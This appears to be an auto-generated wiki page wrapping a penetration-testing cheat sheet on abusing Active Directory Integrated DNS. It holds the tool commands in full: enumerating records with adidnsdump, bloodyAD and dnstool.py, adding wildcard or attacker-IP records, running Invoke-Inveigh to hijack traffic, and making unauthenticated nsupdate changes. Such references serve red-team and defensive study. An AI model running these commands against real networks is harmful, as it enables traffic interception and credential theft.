---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Integrated DNS - ADIDNS

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-integrated-dns` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-integrated-dns.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Integrated DNS - ADIDNS](../../topics/active-directory/active-directory-integrated-dns-adidns.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-integrated-dns |
| name | Active Directory - Integrated DNS - ADIDNS |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-integrated-dns.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Integrated DNS - ADIDNS\n\nADIDNS zone DACL (Discretionary Access Control List) enables regular\
  \ users to create child objects by default, attackers can leverage that and hijack traffic. Active Directory will need some\
  \ time (~180 seconds) to sync LDAP changes via its DNS dynamic updates protocol.\n\n## LDAP-Based (Require authentication)\n\
  \n* Enumerate all records\n\n    ```ps1\n    adidnsdump -u DOMAIN\\\\user --print-zones dc.domain.corp (--dns-tcp)\n   \
  \ # or\n    bloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 get dnsDump\n    ```\n\n* Query a node\n\n\
  \    ```ps1\n    dnstool.py -u 'DOMAIN\\user' -p 'password' --record '*' --action query $DomainController (--legacy)\n \
  \   # or\n    bloodyAD -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'DC=DomainDnsZones,DC=bloody,DC=lab'\
  \ --filter '(&(name=allmightyDC)(objectClass=dnsNode))' --attr dnsRecord\n    ```\n\n* Add a node and attach a record\n\n\
  \    ```ps1\n    dnstool.py -u 'DOMAIN\\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController\n\
  \    # or\n    bloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 add dnsRecord dc1.example.lab <Attacker\
  \ IP>\n\n    bloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 remove dnsRecord dc1.example.lab <Attacker\
  \ IP>\n    ```\n\nThe common way to abuse ADIDNS is to set a wildcard record and then passively listen to the network.\n\
  \n```ps1\nInvoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge\
  \ 1122334455667788 -MachineAccounts Y\n```\n\n## Dynamic Updates (Doesn't require authentication)\n\nDynamic DNS (RFC 2136)\
  \ allows using the DNS protocol to update DNS records:\n\n1. If the zone is set to Secure Only, you need a valid Kerberos\
  \ ticket.\n\n2. If the zone is set to Nonsecure and Secure, anyone on the network can send updates.\n\nUpdate a record:\n\
  \n```ps1\n# Linux\ncat << EOF > dnsupdate.txt\nserver dc.domain.corp\nzone domain.corp\nupdate delete test.domain.corp A\n\
  update add test.domain.corp 3600 A 10.10.10.123\nsend\nEOF\n\nnsupdate dnsupdate.txt\n\n# Windows\nInvoke-DNSupdate -DNSType\
  \ A -DNSName test -DNSData 192.168.125.100 -Verbose\n```\n\n## DNS Reconnaissance\n\nPerform **ADIDNS** searches\n\n```powershell\n\
  StandIn.exe --dns --limit 20\nStandIn.exe --dns --filter SQL --limit 10\nStandIn.exe --dns --forest --domain <domain> --user\
  \ <username> --pass <password>\nStandIn.exe --dns --legacy --domain <domain> --user <username> --pass <password>\n```\n\n\
  ## References\n\n* [Getting in the Zone: dumping Active Directory DNS using adidnsdump - Dirk-jan Mollema](https://blog.fox-it.com/2019/04/25/getting-in-the-zone-dumping-active-directory-dns-using-adidnsdump/)\n\
  * [ADIDNS Revisited – WPAD, GQBL, and More - December 5, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/)\n\
  * [Beyond LLMNR/NBNS Spoofing – Exploiting Active Directory-Integrated DNS - July 10, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/)"
_relative_path: active-directory/ad-integrated-dns.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-integrated-dns.md
````
